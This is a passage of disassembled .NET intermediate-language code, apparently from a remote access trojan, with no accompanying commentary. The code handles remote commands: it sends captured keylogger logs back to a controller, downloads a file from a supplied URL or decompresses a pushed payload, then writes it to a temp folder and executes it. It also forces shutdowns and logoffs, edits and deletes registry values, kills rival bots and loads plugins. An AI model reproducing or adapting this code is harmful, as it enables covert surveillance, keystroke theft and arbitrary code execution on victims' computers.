        IL_189a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_189f:  leave.s    IL_18a1

      }  // end handler
      IL_18a1:  leave      IL_2724

      IL_18a6:  ldc.i4.0
      IL_18a7:  stloc.s    V_137
      IL_18a9:  ldc.i4.0
      IL_18aa:  stloc.s    V_138
      IL_18ac:  ldloc.0
      IL_18ad:  ldc.i4.1
      IL_18ae:  ldelem.ref
      IL_18af:  stloc.s    V_139
      IL_18b1:  ldloc.s    V_139
      IL_18b3:  ldstr      "Error"
      IL_18b8:  ldc.i4.0
      IL_18b9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_18be:  brtrue.s   IL_18c6

      IL_18c0:  ldc.i4.s   64
      IL_18c2:  stloc.s    V_138
      IL_18c4:  br.s       IL_1903

      IL_18c6:  ldloc.s    V_139
      IL_18c8:  ldstr      "Question"
      IL_18cd:  ldc.i4.0
      IL_18ce:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_18d3:  brtrue.s   IL_18db

      IL_18d5:  ldc.i4.s   32
      IL_18d7:  stloc.s    V_138
      IL_18d9:  br.s       IL_1903

      IL_18db:  ldloc.s    V_139
      IL_18dd:  ldstr      "Warning"
      IL_18e2:  ldc.i4.0
      IL_18e3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_18e8:  brtrue.s   IL_18f0

      IL_18ea:  ldc.i4.s   48
      IL_18ec:  stloc.s    V_138
      IL_18ee:  br.s       IL_1903

      IL_18f0:  ldloc.s    V_139
      IL_18f2:  ldstr      "Info"
      IL_18f7:  ldc.i4.0
      IL_18f8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_18fd:  brtrue.s   IL_1903

      IL_18ff:  ldc.i4.s   16
      IL_1901:  stloc.s    V_138
      IL_1903:  ldloc.0
      IL_1904:  ldc.i4.2
      IL_1905:  ldelem.ref
      IL_1906:  stloc.s    V_140
      IL_1908:  ldloc.s    V_140
      IL_190a:  ldstr      "YesNo"
      IL_190f:  ldc.i4.0
      IL_1910:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1915:  brtrue.s   IL_191c

      IL_1917:  ldc.i4.4
      IL_1918:  stloc.s    V_137
      IL_191a:  br.s       IL_197e

      IL_191c:  ldloc.s    V_140
      IL_191e:  ldstr      "YesNoCancel"
      IL_1923:  ldc.i4.0
      IL_1924:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1929:  brtrue.s   IL_1930

      IL_192b:  ldc.i4.3
      IL_192c:  stloc.s    V_137
      IL_192e:  br.s       IL_197e

      IL_1930:  ldloc.s    V_140
      IL_1932:  ldstr      "OK"
      IL_1937:  ldc.i4.0
      IL_1938:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_193d:  brtrue.s   IL_1944

      IL_193f:  ldc.i4.0
      IL_1940:  stloc.s    V_137
      IL_1942:  br.s       IL_197e

      IL_1944:  ldloc.s    V_140
      IL_1946:  ldstr      "OKCancel"
      IL_194b:  ldc.i4.0
      IL_194c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1951:  brtrue.s   IL_1958

      IL_1953:  ldc.i4.1
      IL_1954:  stloc.s    V_137
      IL_1956:  br.s       IL_197e

      IL_1958:  ldloc.s    V_140
      IL_195a:  ldstr      "RetryCancel"
      IL_195f:  ldc.i4.0
      IL_1960:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1965:  brtrue.s   IL_196c

      IL_1967:  ldc.i4.5
      IL_1968:  stloc.s    V_137
      IL_196a:  br.s       IL_197e

      IL_196c:  ldloc.s    V_140
      IL_196e:  ldstr      "AbortRetryCancel"
      IL_1973:  ldc.i4.0
      IL_1974:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1979:  brtrue.s   IL_197e

      IL_197b:  ldc.i4.2
      IL_197c:  stloc.s    V_137
      IL_197e:  ldloc.0
      IL_197f:  ldc.i4.4
      IL_1980:  ldelem.ref
      IL_1981:  ldloc.0
      IL_1982:  ldc.i4.3
      IL_1983:  ldelem.ref
      IL_1984:  ldloc.s    V_137
      IL_1986:  ldloc.s    V_138
      IL_1988:  call       valuetype [System.Windows.Forms]System.Windows.Forms.DialogResult [System.Windows.Forms]System.Windows.Forms.MessageBox::Show(string,
                                                                                                                                                         string,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon)
      IL_198d:  pop
      IL_198e:  leave      IL_2724

      IL_1993:  ldstr      "SAPI.spvoice"
      IL_1998:  ldstr      ""
      IL_199d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
                                                                                                         string)
      IL_19a2:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_19a7:  ldnull
      IL_19a8:  ldstr      "speak"
      IL_19ad:  ldc.i4.1
      IL_19ae:  newarr     [mscorlib]System.Object
      IL_19b3:  dup
      IL_19b4:  ldc.i4.0
      IL_19b5:  ldc.i4.1
      IL_19b6:  newarr     [mscorlib]System.String
      IL_19bb:  dup
      IL_19bc:  ldc.i4.0
      IL_19bd:  ldloc.0
      IL_19be:  ldc.i4.1
      IL_19bf:  ldelem.ref
      IL_19c0:  stelem.ref
      IL_19c1:  call       string [mscorlib]System.String::Concat(string[])
      IL_19c6:  stelem.ref
      IL_19c7:  ldnull
      IL_19c8:  ldnull
      IL_19c9:  ldnull
      IL_19ca:  ldc.i4.1
      IL_19cb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_19d0:  pop
      IL_19d1:  leave      IL_2724

      IL_19d6:  ldstr      "fun"
      IL_19db:  call       bool j.OK::Send(string)
      IL_19e0:  pop
      IL_19e1:  leave      IL_2724

      IL_19e6:  ldc.i4.1
      IL_19e7:  newarr     [mscorlib]System.String
      IL_19ec:  dup
      IL_19ed:  ldc.i4.0
      IL_19ee:  ldloc.0
      IL_19ef:  ldc.i4.1
      IL_19f0:  ldelem.ref
      IL_19f1:  stelem.ref
      IL_19f2:  call       string [mscorlib]System.String::Concat(string[])
      IL_19f7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_19fc:  ldstr      "300"
      IL_1a01:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_1a06:  call       void j.OK::Beep(int32,
                                           int32)
      IL_1a0b:  leave      IL_2724

      IL_1a10:  ldstr      "Shutdown"
      IL_1a15:  ldstr      "/s /t 00"
      IL_1a1a:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_1a1f:  pop
      IL_1a20:  leave      IL_2724

      IL_1a25:  ldstr      "Shutdown"
      IL_1a2a:  ldstr      "/r /t 00"
      IL_1a2f:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_1a34:  pop
      IL_1a35:  leave      IL_2724

      IL_1a3a:  ldstr      "Shutdown"
      IL_1a3f:  ldstr      "/l /f"
      IL_1a44:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_1a49:  pop
      IL_1a4a:  leave      IL_2724

      IL_1a4f:  call       void BotKillers::RunStandardBotKiller()
      IL_1a54:  leave      IL_2724

      IL_1a59:  ldstr      "on"
      IL_1a5e:  stsfld     string j.OK::WINMIN
      IL_1a63:  leave      IL_2724

      IL_1a68:  ldstr      "off"
      IL_1a6d:  stsfld     string j.OK::WINMIN
      IL_1a72:  leave      IL_2724

      IL_1a77:  ldstr      "on"
      IL_1a7c:  stsfld     string j.OK::SCREAM
      IL_1a81:  leave      IL_2724

      IL_1a86:  ldstr      "off"
      IL_1a8b:  stsfld     string j.OK::SCREAM
      IL_1a90:  leave      IL_2724

      IL_1a95:  ldc.i4.0
      IL_1a96:  stsfld     bool j.OK::Cn
      IL_1a9b:  leave      IL_2724

      IL_1aa0:  ldstr      "kl"
      IL_1aa5:  ldsfld     string j.OK::Y
      IL_1aaa:  ldsfld     class j.kl j.OK::kq
      IL_1aaf:  ldflda     string j.kl::Logs
      IL_1ab4:  call       string j.OK::ENB(string&)
      IL_1ab9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_1abe:  call       bool j.OK::Send(string)
      IL_1ac3:  pop
      IL_1ac4:  leave      IL_2724

      IL_1ac9:  ldloc.0
      IL_1aca:  ldc.i4.1
      IL_1acb:  ldelem.ref
      IL_1acc:  stloc.s    V_141
      IL_1ace:  ldloc.s    V_141
      IL_1ad0:  ldstr      "~"
      IL_1ad5:  ldc.i4.0
      IL_1ad6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1adb:  brfalse.s  IL_1afd

      IL_1add:  ldloc.s    V_141
      IL_1adf:  ldstr      "!"
      IL_1ae4:  ldc.i4.0
      IL_1ae5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1aea:  brfalse.s  IL_1b0c

      IL_1aec:  ldloc.s    V_141
      IL_1aee:  ldstr      "@"
      IL_1af3:  ldc.i4.0
      IL_1af4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1af9:  brfalse.s  IL_1b59

      IL_1afb:  br.s       IL_1b61

      IL_1afd:  ldloc.0
      IL_1afe:  ldc.i4.2
      IL_1aff:  ldelem.ref
      IL_1b00:  ldloc.0
      IL_1b01:  ldc.i4.3
      IL_1b02:  ldelem.ref
      IL_1b03:  ldc.i4.1
      IL_1b04:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1b09:  pop
      IL_1b0a:  br.s       IL_1b61

      IL_1b0c:  ldloc.0
      IL_1b0d:  ldc.i4.2
      IL_1b0e:  ldelem.ref
      IL_1b0f:  ldloc.0
      IL_1b10:  ldc.i4.3
      IL_1b11:  ldelem.ref
      IL_1b12:  ldc.i4.1
      IL_1b13:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1b18:  pop
      IL_1b19:  ldstr      "getvalue"
      IL_1b1e:  ldsfld     string j.OK::Y
      IL_1b23:  ldloc.0
      IL_1b24:  ldc.i4.1
      IL_1b25:  ldelem.ref
      IL_1b26:  ldsfld     string j.OK::Y
      IL_1b2b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_1b30:  ldloc.0
      IL_1b31:  ldc.i4.1
      IL_1b32:  ldelem.ref
      IL_1b33:  ldstr      ""
      IL_1b38:  call       object j.OK::GTV(string,
                                            object)
      IL_1b3d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1b42:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_1b47:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1b4c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_1b51:  call       bool j.OK::Send(string)
      IL_1b56:  pop
      IL_1b57:  br.s       IL_1b61

      IL_1b59:  ldloc.0
      IL_1b5a:  ldc.i4.2
      IL_1b5b:  ldelem.ref
      IL_1b5c:  call       void j.OK::DLV(string)
      IL_1b61:  leave      IL_2724

      IL_1b66:  ldloc.2
      IL_1b67:  ldstr      "rn"
      IL_1b6c:  ldc.i4.0
      IL_1b6d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1b72:  brtrue     IL_1d21

      IL_1b77:  ldloc.0
      IL_1b78:  ldc.i4.2
      IL_1b79:  ldelem.ref
      IL_1b7a:  ldc.i4.0
      IL_1b7b:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_1b80:  ldc.i4.s   31
      IL_1b82:  bne.un     IL_1c0a

      .try
      {
        IL_1b87:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_1b8c:  ldloc.0
        IL_1b8d:  ldc.i4.0
        IL_1b8e:  ldelem.ref
        IL_1b8f:  ldsfld     string j.OK::Y
        IL_1b94:  ldloc.0
        IL_1b95:  ldc.i4.1
        IL_1b96:  ldelem.ref
        IL_1b97:  ldsfld     string j.OK::Y
        IL_1b9c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1ba1:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_1ba6:  stloc.s    V_142
        IL_1ba8:  dup
        IL_1ba9:  ldarg.0
        IL_1baa:  ldloc.s    V_142
        IL_1bac:  ldarg.0
        IL_1bad:  ldlen
        IL_1bae:  conv.i4
        IL_1baf:  ldloc.s    V_142
        IL_1bb1:  sub.ovf
        IL_1bb2:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_1bb7:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_1bbc:  call       uint8[] j.OK::ZIP(uint8[])
        IL_1bc1:  stloc.1
        IL_1bc2:  leave      IL_1c61

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1bc7:  dup
        IL_1bc8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1bcd:  stloc.s    V_143
        IL_1bcf:  ldloc.s    V_143
        IL_1bd1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1bd6:  ldstr      "MSG"
        IL_1bdb:  ldsfld     string j.OK::Y
        IL_1be0:  ldstr      "Execute ERROR"
        IL_1be5:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_1bea:  call       bool j.OK::Send(string)
        IL_1bef:  pop
        IL_1bf0:  ldstr      "bla"
        IL_1bf5:  call       bool j.OK::Send(string)
        IL_1bfa:  pop
        IL_1bfb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1c00:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1c05:  leave      IL_2724

      }  // end handler
      IL_1c0a:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_1c0f:  stloc.s    V_4
      .try
      {
        IL_1c11:  ldloc.s    V_4
        IL_1c13:  ldloc.0
        IL_1c14:  ldc.i4.2
        IL_1c15:  ldelem.ref
        IL_1c16:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_1c1b:  stloc.1
        IL_1c1c:  leave.s    IL_1c61

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1c1e:  dup
        IL_1c1f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1c24:  stloc.s    V_144
        IL_1c26:  ldloc.s    V_144
        IL_1c28:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1c2d:  ldstr      "MSG"
        IL_1c32:  ldsfld     string j.OK::Y
        IL_1c37:  ldstr      "Download ERROR"
        IL_1c3c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_1c41:  call       bool j.OK::Send(string)
        IL_1c46:  pop
        IL_1c47:  ldstr      "bla"
        IL_1c4c:  call       bool j.OK::Send(string)
        IL_1c51:  pop
        IL_1c52:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1c57:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1c5c:  leave      IL_2724

      }  // end handler
      IL_1c61:  ldstr      "bla"
      IL_1c66:  call       bool j.OK::Send(string)
      IL_1c6b:  pop
      IL_1c6c:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_1c71:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
      IL_1c76:  stloc.s    V_145
      IL_1c78:  ldloca.s   V_145
      IL_1c7a:  constrained. [mscorlib]System.Guid
      IL_1c80:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_1c85:  ldstr      "-"
      IL_1c8a:  ldstr      ""
      IL_1c8f:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_1c94:  ldstr      "."
      IL_1c99:  ldloc.0
      IL_1c9a:  ldc.i4.1
      IL_1c9b:  ldelem.ref
      IL_1c9c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_1ca1:  stloc.s    V_5
      .try
      {
        IL_1ca3:  ldloc.s    V_5
        IL_1ca5:  ldloc.1
        IL_1ca6:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_1cab:  ldloc.s    V_5
        IL_1cad:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_1cb2:  pop
        IL_1cb3:  ldstr      "MSG"
        IL_1cb8:  ldsfld     string j.OK::Y
        IL_1cbd:  ldstr      "Executed As "
        IL_1cc2:  ldloc.s    V_5
        IL_1cc4:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_1cc9:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_1cce:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1cd3:  call       bool j.OK::Send(string)
        IL_1cd8:  pop
        IL_1cd9:  leave      IL_2724

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1cde:  dup
        IL_1cdf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1ce4:  stloc.s    V_146
        IL_1ce6:  ldloc.s    V_146
        IL_1ce8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1ced:  ldloc.s    V_146
        IL_1cef:  stloc.s    V_147
        IL_1cf1:  ldstr      "MSG"
        IL_1cf6:  ldsfld     string j.OK::Y
        IL_1cfb:  ldstr      "Execute ERROR "
        IL_1d00:  ldloc.s    V_147
        IL_1d02:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_1d07:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1d0c:  call       bool j.OK::Send(string)
        IL_1d11:  pop
        IL_1d12:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1d17:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1d1c:  leave      IL_2724

      }  // end handler
      IL_1d21:  ldloc.2
      IL_1d22:  ldstr      "inv"
      IL_1d27:  ldc.i4.0
      IL_1d28:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1d2d:  brfalse.s  IL_1d67

      IL_1d2f:  ldloc.2
      IL_1d30:  ldstr      "ret"
      IL_1d35:  ldc.i4.0
      IL_1d36:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1d3b:  brfalse    IL_1f98

      IL_1d40:  ldloc.2
      IL_1d41:  ldstr      "CAP"
      IL_1d46:  ldc.i4.0
      IL_1d47:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1d4c:  brfalse    IL_2109

      IL_1d51:  ldloc.2
      IL_1d52:  ldstr      "un"
      IL_1d57:  ldc.i4.0
      IL_1d58:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1d5d:  brfalse    IL_22ab

      IL_1d62:  br         IL_2313

      IL_1d67:  ldloc.0
      IL_1d68:  ldc.i4.1
      IL_1d69:  ldelem.ref
      IL_1d6a:  ldc.i4.0
      IL_1d6b:  newarr     [mscorlib]System.Byte
      IL_1d70:  call       object j.OK::GTV(string,
                                            object)
      IL_1d75:  castclass  uint8[]
      IL_1d7a:  stloc.s    V_148
      IL_1d7c:  ldloc.0
      IL_1d7d:  ldc.i4.3
      IL_1d7e:  ldelem.ref
      IL_1d7f:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1d84:  ldc.i4.s   10
      IL_1d86:  clt
      IL_1d88:  ldloc.s    V_148
      IL_1d8a:  ldlen
      IL_1d8b:  conv.i4
      IL_1d8c:  ldc.i4.0
      IL_1d8d:  ceq
      IL_1d8f:  and
      IL_1d90:  brfalse.s  IL_1dcf

      IL_1d92:  ldc.i4.5
      IL_1d93:  newarr     [mscorlib]System.String
      IL_1d98:  dup
      IL_1d99:  ldc.i4.0
      IL_1d9a:  ldstr      "pl"
      IL_1d9f:  stelem.ref
      IL_1da0:  dup
      IL_1da1:  ldc.i4.1
      IL_1da2:  ldsfld     string j.OK::Y
      IL_1da7:  stelem.ref
      IL_1da8:  dup
      IL_1da9:  ldc.i4.2
      IL_1daa:  ldloc.0
      IL_1dab:  ldc.i4.1
      IL_1dac:  ldelem.ref
      IL_1dad:  stelem.ref
      IL_1dae:  dup
      IL_1daf:  ldc.i4.3
      IL_1db0:  ldsfld     string j.OK::Y
      IL_1db5:  stelem.ref
      IL_1db6:  dup
      IL_1db7:  ldc.i4.4
      IL_1db8:  ldc.i4.1
      IL_1db9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1dbe:  stelem.ref
      IL_1dbf:  call       string [mscorlib]System.String::Concat(string[])
      IL_1dc4:  call       bool j.OK::Send(string)
      IL_1dc9:  pop
      IL_1dca:  br         IL_1f93

      IL_1dcf:  ldloc.0
      IL_1dd0:  ldc.i4.3
      IL_1dd1:  ldelem.ref
      IL_1dd2:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1dd7:  ldc.i4.s   10
      IL_1dd9:  ble.s      IL_1e48

      IL_1ddb:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1de0:  stloc.s    V_150
      IL_1de2:  ldc.i4.6
      IL_1de3:  newarr     [mscorlib]System.String
      IL_1de8:  dup
      IL_1de9:  ldc.i4.0
      IL_1dea:  ldloc.0
      IL_1deb:  ldc.i4.0
      IL_1dec:  ldelem.ref
      IL_1ded:  stelem.ref
      IL_1dee:  dup
      IL_1def:  ldc.i4.1
      IL_1df0:  ldsfld     string j.OK::Y
      IL_1df5:  stelem.ref
      IL_1df6:  dup
      IL_1df7:  ldc.i4.2
      IL_1df8:  ldloc.0
      IL_1df9:  ldc.i4.1
      IL_1dfa:  ldelem.ref
      IL_1dfb:  stelem.ref
      IL_1dfc:  dup
      IL_1dfd:  ldc.i4.3
      IL_1dfe:  ldsfld     string j.OK::Y
      IL_1e03:  stelem.ref
      IL_1e04:  dup
      IL_1e05:  ldc.i4.4
      IL_1e06:  ldloc.0
      IL_1e07:  ldc.i4.2
      IL_1e08:  ldelem.ref
      IL_1e09:  stelem.ref
      IL_1e0a:  dup
      IL_1e0b:  ldc.i4.5
      IL_1e0c:  ldsfld     string j.OK::Y
      IL_1e11:  stelem.ref
      IL_1e12:  call       string [mscorlib]System.String::Concat(string[])
      IL_1e17:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1e1c:  stloc.s    V_151
      IL_1e1e:  ldloc.s    V_150
      IL_1e20:  ldarg.0
      IL_1e21:  ldloc.s    V_151
      IL_1e23:  ldarg.0
      IL_1e24:  ldlen
      IL_1e25:  conv.i4
      IL_1e26:  ldloc.s    V_151
      IL_1e28:  sub.ovf
      IL_1e29:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_1e2e:  ldloc.s    V_150
      IL_1e30:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1e35:  call       uint8[] j.OK::ZIP(uint8[])
      IL_1e3a:  stloc.s    V_148
      IL_1e3c:  ldloc.0
      IL_1e3d:  ldc.i4.1
      IL_1e3e:  ldelem.ref
      IL_1e3f:  ldloc.s    V_148
      IL_1e41:  ldc.i4.3
      IL_1e42:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1e47:  pop
      IL_1e48:  ldc.i4.5
      IL_1e49:  newarr     [mscorlib]System.String
      IL_1e4e:  dup
      IL_1e4f:  ldc.i4.0
      IL_1e50:  ldstr      "pl"
      IL_1e55:  stelem.ref
      IL_1e56:  dup
      IL_1e57:  ldc.i4.1
      IL_1e58:  ldsfld     string j.OK::Y
      IL_1e5d:  stelem.ref
      IL_1e5e:  dup
      IL_1e5f:  ldc.i4.2
      IL_1e60:  ldloc.0
      IL_1e61:  ldc.i4.1
      IL_1e62:  ldelem.ref
      IL_1e63:  stelem.ref
      IL_1e64:  dup
      IL_1e65:  ldc.i4.3
      IL_1e66:  ldsfld     string j.OK::Y
      IL_1e6b:  stelem.ref
      IL_1e6c:  dup
      IL_1e6d:  ldc.i4.4
      IL_1e6e:  ldc.i4.0
      IL_1e6f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1e74:  stelem.ref
      IL_1e75:  call       string [mscorlib]System.String::Concat(string[])
      IL_1e7a:  call       bool j.OK::Send(string)
      IL_1e7f:  pop
      IL_1e80:  ldloc.s    V_148
      IL_1e82:  ldstr      "A"
      IL_1e87:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_1e8c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1e91:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1e96:  stloc.s    V_149
      IL_1e98:  ldloc.s    V_149
      IL_1e9a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1e9f:  ldnull
      IL_1ea0:  ldstr      "h"
      IL_1ea5:  ldc.i4.1
      IL_1ea6:  newarr     [mscorlib]System.Object
      IL_1eab:  dup
      IL_1eac:  ldc.i4.0
      IL_1ead:  ldsfld     string j.OK::H
      IL_1eb2:  stelem.ref
      IL_1eb3:  ldnull
      IL_1eb4:  ldnull
      IL_1eb5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1eba:  ldloc.s    V_149
      IL_1ebc:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1ec1:  ldnull
      IL_1ec2:  ldstr      "p"
      IL_1ec7:  ldc.i4.1
      IL_1ec8:  newarr     [mscorlib]System.Object
      IL_1ecd:  dup
      IL_1ece:  ldc.i4.0
      IL_1ecf:  ldsfld     string j.OK::P
      IL_1ed4:  stelem.ref
      IL_1ed5:  ldnull
      IL_1ed6:  ldnull
      IL_1ed7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1edc:  ldloc.s    V_149
